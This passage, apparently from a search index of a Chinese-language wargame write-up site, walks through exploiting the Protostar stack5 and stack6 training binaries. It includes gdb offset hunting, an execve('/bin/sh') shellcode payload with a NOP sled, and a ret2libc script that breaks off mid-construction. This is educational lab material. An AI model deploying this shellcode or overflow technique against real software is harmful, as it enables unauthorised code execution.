200\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'\ngdb-peda$ run\nStarting program: /opt/protostar/bin/stack5 \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\nProgram received signal SIGSEGV, Segmentation fault.\nWarning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.\nUse 'set logging enabled off'.\n\nWarning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.\nUse 'set logging enabled on'.\n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffce50 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\nEBX: 0xf7f95e14 --&gt; 0x232d0c ('\\x0c-#')\nECX: 0xf7f978ec --&gt; 0x0 \nEDX: 0x0 \nESI: 0x80483f0 (&lt;__libc_csu_init&gt;:      push   ebp)\nEDI: 0xf7ffcb60 --&gt; 0x0 \nEBP: 0x65414149 ('IAAe')\nESP: 0xffffcea0 (\"AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\nEIP: 0x41344141 ('AA4A')\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41344141\n[------------------------------------stack-------------------------------------]\n0000| 0xffffcea0 (\"AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0004| 0xffffcea4 (\"fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0008| 0xffffcea8 (\"AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0012| 0xffffceac (\"AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0016| 0xffffceb0 (\"6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0020| 0xffffceb4 (\"AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0024| 0xffffceb8 (\"A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0028| 0xffffcebc (\"MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x41344141 in ?? ()\ngdb-peda$ pattern_offset 0x41344141\n1093943617 found at offset: 76\n</code></pre>"},{"location":"pwn/Protostar_stack5/#76","title":"\u5f97\u5230\u6ea2\u51fa\u7684\u957f\u5ea6\u4e3a76","text":""},{"location":"pwn/Protostar_stack5/#shellcode","title":"\u4e0b\u9762\u5206\u6790shellcode\u7684\u5730\u5740\uff0c\u4e5f\u5c31\u662f\u7f13\u51b2\u533a\u7684\u8d77\u59cb\u5730\u5740","text":"<pre><code>\u2514\u2500$ python -c \"print('a'*76 + 'bbbb')\" | ./stack5                  \nzsh: done                              python -c \"print('a'*76 + 'bbbb')\" | \nzsh: segmentation fault (core dumped)  ./stack5\n\n\u250c\u2500\u2500(kali\u327fkali)-[/opt/protostar/bin]\n\u2514\u2500$ gdb -q ./stack5 core.106045 \nSuccessfully imported six module\nReading symbols from ./stack5...\n[New LWP 106045]\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\nCore was generated by `./stack5'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x62626262 in ?? ()\n(gdb) x/100x $esp-80\n0xffffce90:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffcea0:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffceb0:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffcec0:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffced0:     0x61616161      0x61616161      0x61616161      0x62626262\n0xffffcee0:     0x00000000      0xffffcf94      0xffffcf9c      0xffffcf00\n0xffffcef0:     0xf7f95e14      0x080483c4      0x00000001      0xffffcf94\n0xffffcf00:     0xf7f95e14      0x080483f0      0xf7ffcb60      0x00000000\n0xffffcf10:     0x6e83a210      0x21e76400      0x00000000      0x00000000\n0xffffcf20:     0x00000000      0xf7ffcb60      0x00000000      0x4b3b3500\n0xffffcf30:     0xf7ffda60      0xf7d87c56      0xf7f95e14      0xf7d87d88\n0xffffcf40:     0xf7fc7ac4      0xf7ffcfec      0x00000001      0x08048310\n0xffffcf50:     0x00000000      0xf7fd8390      0xf7d87d09      0xf7ffcfec\n0xffffcf60:     0x00000001      0x08048310      0x00000000      0x08048331\n0xffffcf70:     0x080483c4      0x00000001      0xffffcf94      0x080483f0\n0xffffcf80:     0x080483e0      0xf7fcbd20      0xffffcf8c      0xf7ffda60\n0xffffcf90:     0x00000001      0xffffd17c      0x00000000      0xffffd185\n0xffffcfa0:     0xffffd194      0xffffd1a8      0xffffd1cb      0xffffd201\n0xffffcfb0:     0xffffd222      0xffffd22f      0xffffd24d      0xffffd269\n0xffffcfc0:     0xffffd279      0xffffd28a      0xffffd294      0xffffd2a1\n0xffffcfd0:     0xffffd2b2      0xffffd2d1      0xffffd37d      0xffffd39b\n0xffffcfe0:     0xffffd3b6      0xffffd3cd      0xffffd3e0      0xffffd3fe\n0xffffcff0:     0xffffd419      0xffffd467      0xffffd47a      0xffffd482\n0xffffd000:     0xffffd495      0xffffd4c4      0xffffd4d8      0xffffd4e2\n0xffffd010:     0xffffd4ed      0xffffd50f      0xffffd530      0xffffd549\n</code></pre>"},{"location":"pwn/Protostar_stack5/#0xffffce90","title":"\u53ef\u4ee5\u770b\u5230\uff0c0xffffce90\u5c31\u662f\u7f13\u51b2\u533a\u7684\u6808\u9876","text":""},{"location":"pwn/Protostar_stack5/#_3","title":"\u4e0b\u9762\u7f16\u5199\u5229\u7528\u811a\u672c\uff1a","text":"<p><pre><code>from pwn import *\n\n\n#x86 Linux execve(\"/bin/sh\") shellcode\n'''\nxor eax, eax        ; \\x31\\xc0 - \u5c06EAX\u6e05\u96f6\npush eax            ; \\x50 - \u538b\u5165\u7a7a\u7ec8\u6b62\u7b26(0)\npush 0x68732f2f     ; \\x68\\x2f\\x2f\\x73\\x68 - \u538b\u5165\"//sh\" (\u5c0f\u7aef\u5e8f)\npush 0x6e69622f     ; \\x68\\x2f\\x62\\x69\\x6e - \u538b\u5165\"/bin\" (\u5c0f\u7aef\u5e8f)\nmov ebx, esp        ; \\x89\\xe3 - EBX\u6307\u5411\u5b57\u7b26\u4e32\"/bin//sh\"\npush eax            ; \\x50 - \u538b\u5165NULL\u4f5c\u4e3aargv\u7ed3\u675f\u7b26\nmov edx, esp        ; \\x89\\xe2 - EDX\u6307\u5411\u73af\u5883\u53d8\u91cf\u6570\u7ec4(\u8bbe\u4e3aNULL)\npush ebx            ; \\x53 - \u538b\u5165EBX(\u5373\"/bin//sh\"\u5730\u5740)\u4f5c\u4e3aargv[0]\nmov ecx, esp        ; \\x89\\xe1 - ECX\u6307\u5411argv\u6570\u7ec4\nmov al, 0xb         ; \\xb0\\x0b - \u8bbe\u7f6e\u7cfb\u7edf\u8c03\u7528\u53f7(execve=11)\nint 0x80            ; \\xcd\\x80 - \u89e6\u53d1\u7cfb\u7edf\u8c03\u7528\n'''\nshellcode = b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n\nnop_sled = b'\\x90' * 32\npadding_length = 76 - len(nop_sled) - len(shellcode)\npadding = b'A' * padding_length\nreturn_addr = p32(0xffffce90 + 16)  # \u5b89\u5168\u5730\u6307\u5411NOP\u6ed1\u677f\u4e2d\u95f4\n\npayload = nop_sled + shellcode + padding + return_addr\n\nsh = process('./stack5')\nsh.sendline(payload)\nsh.interactive()\n</code></pre> </p>"},{"location":"pwn/Protostar_stack5/#shellcode-asmshellcraftsheof","title":"\u4e0d\u76f4\u63a5\u4f7f\u7528shellcode = asm(shellcraft.sh()),\u662f\u56e0\u4e3a\u8fd0\u884c\u811a\u672c\u4f1a\u62a5EOF\u9519\u8bef(\u5934\u5927\u4e86\u5f88\u4e45)\uff0c\u540e\u9762\u4ed4\u7ec6\u6392\u67e5\u53d1\u73b0\u539f\u56e0\u5982\u4e0b\uff1a","text":""},{"location":"pwn/Protostar_stack5/#shellcode-asmshellcraftsh44x86-execve-binsh-shellcode23-28","title":"shellcode = asm(shellcraft.sh())\u7684\u957f\u5ea6\u4e3a44,\u6bd4\u5178\u578b\u7684x86 execve /bin/sh shellcode\uff08\u901a\u5e3823-28\u5b57\u8282\uff09\u8981\u957f\u5f97\u591a","text":""},{"location":"pwn/Protostar_stack5/#payload","title":"payload\u7ed3\u6784\uff1a","text":"<p><code>[NOP 32\u5b57\u8282][shellcode 44\u5b57\u8282][\u586b\u5145 0\u5b57\u8282][\u8fd4\u56de\u5730\u5740 4\u5b57\u8282]</code> - \u7f13\u51b2\u533a\u603b\u5927\u5c0f\uff1a76\u5b57\u8282 - 32 + 44 = 76\u5b57\u8282\uff08\u521a\u597d\u586b\u6ee1\u7f13\u51b2\u533a\uff09 - \u6ca1\u6709\u7559\u4e0b\u4efb\u4f55\u7a7a\u95f4\u7ed9shellcode\u6267\u884c\u65f6\u4f7f\u7528\u7684\u6808\u7a7a\u95f4</p>"},{"location":"pwn/Protostar_stack5/#shellcodeshellcode-asmshellcraftsh","title":"\u4f46\u662f\uff0cshellcode\u6267\u884c\u65f6\u9700\u8981\u5728\u6808\u4e0a\u521b\u5efa\u53c2\u6570\u6570\u7ec4\u548c\u73af\u5883\u53d8\u91cf\uff0c\u4f46\u7f13\u51b2\u533a\u5df2\u88ab\u5b8c\u5168\u586b\u6ee1\uff0c\u6ca1\u6709\u989d\u5916\u7a7a\u95f4\uff0c\u6240\u4ee5\u6ca1\u6709\u91c7\u7528<code>shellcode = asm(shellcraft.sh())</code>","text":""},{"location":"pwn/Protostar_stack6/","title":"Protostar stack6","text":"<pre><code>Stack6 looks at what happens when you have restrictions on the return address.\n\nThis level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.\n\nIt is strongly suggested you experiment with multiple ways of getting your code to execute here.\n\nThis level is at /opt/protostar/bin/stack6\n</code></pre>"},{"location":"pwn/Protostar_stack6/#source-code","title":"Source code","text":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid getpath()\n{\n  char buffer[64];\n  unsigned int ret;\n\n  printf(\"input path please: \"); fflush(stdout);\n\n  gets(buffer);\n\n  ret = __builtin_return_address(0);\n  //GCC\u63d0\u4f9b\u7684\u4e00\u4e2a\u5185\u5efa\u51fd\u6570\uff08built-in function\uff09\uff0c\u7528\u4e8e\u83b7\u53d6\u51fd\u6570\u8c03\u7528\u6808\u4e2d\u7684\u8fd4\u56de\u5730\u5740\n  //- \u53c2\u6570`0`\u8868\u793a\u83b7\u53d6\u5f53\u524d\u51fd\u6570(getpath)\u7684\u8fd4\u56de\u5730\u5740\n  //- \u5373\u5f53getpath\u6267\u884c\u5b8c\u6bd5\u540e\uff0c\u7a0b\u5e8f\u5c06\u8981\u8df3\u8f6c\u56de\u53bb\u6267\u884c\u7684\u5730\u5740\uff08\u901a\u5e38\u662fmain\u51fd\u6570\u4e2d\u8c03\u7528getpath\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff09\n\n  if((ret &amp; 0xbf000000) == 0xbf000000) {\n  //\u68c0\u67e5\u8fd4\u56de\u5730\u5740\u662f\u5426\u4f4d\u4e8e0xbf000000\u5f00\u59cb\u7684\u5185\u5b58\u533a\u57df(- \u5728Linux\u7cfb\u7edf\u4e2d\uff0c\u6808\u5185\u5b58\u901a\u5e38\u4f4d\u4e8e0xbf000000\u9644\u8fd1\u7684\u5730\u5740\u8303\u56f4)\n    printf(\"bzzzt (%p)\\n\", ret);\n    //- \u8fd9\u4e2a\u68c0\u67e5\u662f\u4e3a\u4e86\u9632\u6b62\u653b\u51fb\u8005\u901a\u8fc7\u7f13\u51b2\u533a\u6ea2\u51fa\u5c06\u8fd4\u56de\u5730\u5740\u8986\u76d6\u4e3a\u6307\u5411\u6808\u4e0a\u7684\u5730\u5740\uff08\u901a\u5e38\u662f\u653b\u51fb\u8005\u6ce8\u5165\u7684shellcode\u4f4d\u7f6e\uff09\n    //\u5982\u679c\u68c0\u6d4b\u5230\u8fd4\u56de\u5730\u5740\u5728\u6808\u4e0a\uff080xbf000000\u533a\u57df\uff09\uff0c\u7a0b\u5e8f\u4f1a\u8f93\u51fa\"bzzzt\"\u5e76\u7acb\u5373\u9000\u51fa\uff0c\u9632\u6b62\u6f5c\u5728\u7684\u653b\u51fb\n    _exit(1);\n  }\n\n  printf(\"got path %s\\n\", buffer);\n}\n\nint main(int argc, char **argv)\n{\n  getpath();\n}\n</code></pre> <pre><code>\u2514\u2500$ checksec --file=stack6\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nNo RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   72 Symbols        No    0               2               stack6\n</code></pre> <pre><code>\u2514\u2500$ objdump -t -j .text stack6\n\nstack6:     file format elf32-i386\n\nSYMBOL TABLE:\n080483d0 l    d  .text  00000000              .text\n08048400 l     F .text  00000000              __do_global_dtors_aux\n08048460 l     F .text  00000000              frame_dummy\n08048580 l     F .text  00000000              __do_global_ctors_aux\n08048510 g     F .text  00000005              __libc_csu_fini\n080483d0 g     F .text  00000000              _start\n08048520 g     F .text  0000005a              __libc_csu_init\n08048484 g     F .text  00000076              getpath\n0804857a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx\n080484fa g     F .text  0000000f              main\n</code></pre>"},{"location":"pwn/Protostar_stack6/#_1","title":"\u9996\u5148\u8ba1\u7b97\u504f\u79fb\u91cf","text":"<pre><code>\u2514\u2500$ gdb-peda\nSuccessfully imported six module\ngdb-peda$ file stack6\nReading symbols from stack6...\ngdb-peda$ b main\nBreakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.\ngdb-peda$ runQuit\ngdb-peda$ pattern_create 200\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'\ngdb-peda$ run\nStarting program: /opt/protostar/bin/stack6 \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\nWarning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.\nUse 'set logging enabled off'.\n\nWarning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.\nUse 'set logging enabled on'.\n\n[----------------------------------registers-----------------------------------]\nEAX: 0x80484fa (&lt;main&gt;: push   ebp)\nEBX: 0xf7f95e14 --&gt; 0x232d0c ('\\x0c-#')\nECX: 0x517004fa \nEDX: 0xffffcec0 --&gt; 0xf7f95e14 --&gt; 0x232d0c ('\\x0c-#')\nESI: 0x8048520 (&lt;__libc_csu_init&gt;:      push   ebp)\nEDI: 0xf7ffcb60 --&gt; 0x0 \nEBP: 0xffffce98 --&gt; 0x0 \nESP: 0xffffce90 --&gt; 0x0 \nEIP: 0x8048500 (&lt;main+6&gt;:       call   0x8048484 &lt;getpath&gt;)\nEFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x80484fa &lt;main&gt;:    push   ebp\n   0x80484fb &lt;main+1&gt;:  mov    ebp,esp\n   0x80484fd &lt;main+3&gt;:  and    esp,0xfffffff0\n=&gt; 0x8048500 &lt;main+6&gt;:  call   0x8048484 &lt;getpath&gt;\n   0x8048505 &lt;main+11&gt;: mov    esp,ebp\n   0x8048507 &lt;main+13&gt;: pop    ebp\n   0x8048508 &lt;main+14&gt;: ret\n   0x8048509:   nop\nGuessed arguments:\narg[0]: 0x0 \n[------------------------------------stack-------------------------------------]\n0000| 0xffffce90 --&gt; 0x0 \n0004| 0xffffce94 --&gt; 0x0 \n0008| 0xffffce98 --&gt; 0x0 \n0012| 0xffffce9c --&gt; 0xf7d87cc3 (&lt;__libc_start_call_main+115&gt;:  add    esp,0x10)\n0016| 0xffffcea0 --&gt; 0x1 \n0020| 0xffffcea4 --&gt; 0xffffcf54 --&gt; 0xffffd147 (\"/opt/protostar/bin/stack6\")\n0024| 0xffffcea8 --&gt; 0xffffcf5c --&gt; 0xffffd161 (\"LESS_TERMCAP_se=\\033[0m\")\n0028| 0xffffceac --&gt; 0xffffcec0 --&gt; 0xf7f95e14 --&gt; 0x232d0c ('\\x0c-#')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, main (argc=0x1, argv=0xffffcf54) at stack6/stack6.c:27\nwarning: 27     stack6/stack6.c: No such file or directory\ngdb-peda$ n\ninput path please: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\ngot path AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0xd2 \nEBX: 0xf7f95e14 --&gt; 0x232d0c ('\\x0c-#')\nECX: 0x0 \nEDX: 0x0 \nESI: 0x8048520 (&lt;__libc_csu_init&gt;:      push   ebp)\nEDI: 0xf7ffcb60 --&gt; 0x0 \nEBP: 0x41344141 ('AA4A')\nESP: 0xffffce90 (\"fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\nEIP: 0x41414a41 ('AJAA')\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41414a41\n[------------------------------------stack-------------------------------------]\n0000| 0xffffce90 (\"fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0004| 0xffffce94 (\"AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0008| 0xffffce98 (\"AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0012| 0xffffce9c (\"6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0016| 0xffffcea0 (\"AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0020| 0xffffcea4 (\"A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0024| 0xffffcea8 (\"MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n0028| 0xffffceac (\"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x41414a41 in ?? ()\ngdb-peda$ pattern_offset 0x41414a41\n1094797889 found at offset: 80\ngdb-peda$ \n</code></pre>"},{"location":"pwn/Protostar_stack6/#80","title":"\u53ef\u4ee5\u770b\u5230\u504f\u79fb\u91cf\u4e3a80","text":""},{"location":"pwn/Protostar_stack6/#_2","title":"\u67e5\u770b\u5185\u5b58\u6620\u5c04","text":""},{"location":"pwn/Protostar_stack6/#gdb-peda-info-proc-map-process-13899-mapped-address-spaces-start-addr-end-addr-size-offset-perms-file-0x08048000-0x08049000-0x1000-0x0-r-xp-optprotostarbinstack6-0x08049000-0x0804a000-0x1000-0x0-rw-p-optprotostarbinstack6-0x0804a000-0x0806c000-0x22000-0x0-rw-p-heap-0xf7d63000-0xf7d86000-0x23000-0x0-r-p-usrlibi386-linux-gnulibcso6-0xf7d86000-0xf7f0f000-0x189000-0x23000-r-xp-usrlibi386-linux-gnulibcso6-0xf7f0f000-0xf7f94000-0x85000-0x1ac000-r-p-usrlibi386-linux-gnulibcso6-0xf7f94000-0xf7f96000-0x2000-0x231000-r-p-usrlibi386-linux-gnulibcso6-0xf7f96000-0xf7f97000-0x1000-0x233000-rw-p-usrlibi386-linux-gnulibcso6-0xf7f97000-0xf7fa1000-0xa000-0x0-rw-p-0xf7fbf000-0xf7fc1000-0x2000-0x0-rw-p-0xf7fc1000-0xf7fc5000-0x4000-0x0-r-p-vvar-0xf7fc5000-0xf7fc7000-0x2000-0x0-r-xp-vdso-0xf7fc7000-0xf7fc8000-0x1000-0x0-r-p-usrlibi386-linux-gnuld-linuxso2-0xf7fc8000-0xf7fec000-0x24000-0x1000-r-xp-usrlibi386-linux-gnuld-linuxso2-0xf7fec000-0xf7ffb000-0xf000-0x25000-r-p-usrlibi386-linux-gnuld-linuxso2-0xf7ffb000-0xf7ffd000-0x2000-0x33000-r-p-usrlibi386-linux-gnuld-linuxso2-0xf7ffd000-0xf7ffe000-0x1000-0x35000-rw-p-usrlibi386-linux-gnuld-linuxso2-0xfffdd000-0xffffe000-0x21000-0x0-rwxp-stack","title":"<pre><code>gdb-peda$ info proc map\nprocess 13899\nMapped address spaces:\n\nStart Addr End Addr   Size       Offset     Perms File \n0x08048000 0x08049000 0x1000     0x0        r-xp  /opt/protostar/bin/stack6 \n0x08049000 0x0804a000 0x1000     0x0        rw-p  /opt/protostar/bin/stack6 \n0x0804a000 0x0806c000 0x22000    0x0        rw-p  [heap] \n0xf7d63000 0xf7d86000 0x23000    0x0        r--p  /usr/lib/i386-linux-gnu/libc.so.6 \n0xf7d86000 0xf7f0f000 0x189000   0x23000    r-xp  /usr/lib/i386-linux-gnu/libc.so.6 \n0xf7f0f000 0xf7f94000 0x85000    0x1ac000   r--p  /usr/lib/i386-linux-gnu/libc.so.6 \n0xf7f94000 0xf7f96000 0x2000     0x231000   r--p  /usr/lib/i386-linux-gnu/libc.so.6 \n0xf7f96000 0xf7f97000 0x1000     0x233000   rw-p  /usr/lib/i386-linux-gnu/libc.so.6 \n0xf7f97000 0xf7fa1000 0xa000     0x0        rw-p   \n0xf7fbf000 0xf7fc1000 0x2000     0x0        rw-p   \n0xf7fc1000 0xf7fc5000 0x4000     0x0        r--p  [vvar] \n0xf7fc5000 0xf7fc7000 0x2000     0x0        r-xp  [vdso] \n0xf7fc7000 0xf7fc8000 0x1000     0x0        r--p  /usr/lib/i386-linux-gnu/ld-linux.so.2 \n0xf7fc8000 0xf7fec000 0x24000    0x1000     r-xp  /usr/lib/i386-linux-gnu/ld-linux.so.2 \n0xf7fec000 0xf7ffb000 0xf000     0x25000    r--p  /usr/lib/i386-linux-gnu/ld-linux.so.2 \n0xf7ffb000 0xf7ffd000 0x2000     0x33000    r--p  /usr/lib/i386-linux-gnu/ld-linux.so.2 \n0xf7ffd000 0xf7ffe000 0x1000     0x35000    rw-p  /usr/lib/i386-linux-gnu/ld-linux.so.2 \n0xfffdd000 0xffffe000 0x21000    0x0        rwxp  [stack] \n</code></pre>","text":""},{"location":"pwn/Protostar_stack6/#ret2libc","title":"ret2libc","text":"<pre><code># \u68c0\u67e5ASLR\u72b6\u6001\ncat /proc/sys/kernel/randomize_va_space\n- \u5982\u679c\u8f93\u51fa\u662f`0`\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528GDB\u5730\u5740\n- \u5982\u679c\u8f93\u51fa\u662f`1`\u6216`2`\uff0c\u5fc5\u987b\u4f7f\u7528\u6cc4\u9732\u6280\u672f\n</code></pre>"},{"location":"pwn/Protostar_stack6/#1stack6aslr","title":"1\u3001\u9002\u7528\u4e8estack6\u7684\u60c5\u51b5\uff08ASLR\u5173\u95ed\uff09","text":"<pre><code>\u2514\u2500$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n[sudo] password for kali: \n0\n</code></pre>"},{"location":"pwn/Protostar_stack6/#libc-system","title":"\u83b7\u53d6libc\u4e2d system\u51fd\u6570\u7684\u5165\u53e3\u5730\u5740","text":"<pre><code>gdb-peda$ p system\n$3 = {int (const char *)} 0xf7db5220 &lt;__libc_system&gt;\n</code></pre>"},{"location":"pwn/Protostar_stack6/#exit","title":"\u83b7\u53d6exit\u5730\u5740","text":"<pre><code>gdb-peda$ p exit\n$4 = {void (int)} 0xf7da1ad0 &lt;__GI_exit&gt;\n</code></pre>"},{"location":"pwn/Protostar_stack6/#binsh","title":"\u83b7\u53d6/bin/sh\u5b57\u7b26\u4e32\u7684\u5730\u5740","text":"<pre><code>gdb-peda$ find \"/bin/sh\"\nSearching for '/bin/sh' in: None ranges\nFound 1 results, display max 1 items:\nlibc.so.6 : 0xf7f29e52 (\"/bin/sh\")\n</code></pre>"},{"location":"pwn/Protostar_stack6/#exp","title":"\u6784\u9020exp","text":"<p><pre><code>from pwn import *\nimport sys\n\n# \u8bbe\u7f6e\u4e0a\u4e0b\u6587\u73af\u5883\uff08i386\u67b6\u6784\uff09\ncontext(arch='i386', os='linux')\n\n# \u504f\u79fb\u91cf\uff1a\u4ecebuffer\u5230\u8fd4\u56de\u5730\u5740\noffset = 80\n\n# \u4eceGDB\u4e2d\u83b7\u53d6\u7684\u5730\u5740\nsystem_addr = 0xf7db5220  # p system \u7684\u7ed3\u679c\nexit_addr = 0xf7da1ad0    # p exit \u7684\u7ed3\u679c\nbinsh_addr = 0xf7f29e52   # find \"/bin/sh\" \u7684\u7ed3\u679c\n\n# \u6784\u5efapayload\npayload = b\"A\" * offset  # \u586b\u5145\u7f13\u51b2\u533a\n\n# 1. \u8986\u76d6\u8fd4\u56de\u5730\u5740\u4e3a system()\npayload += p32(system_addr)\n\n# 2. \u6dfb\u52a0 system \u7684\u8fd4\u56de\u5730\u5740\uff08exit()\uff0c\u9632\u6b62\u7a0b\u5e8f\u5d29\u6e83\uff09\npayload += p32(exit_addr)\n\n# 3. 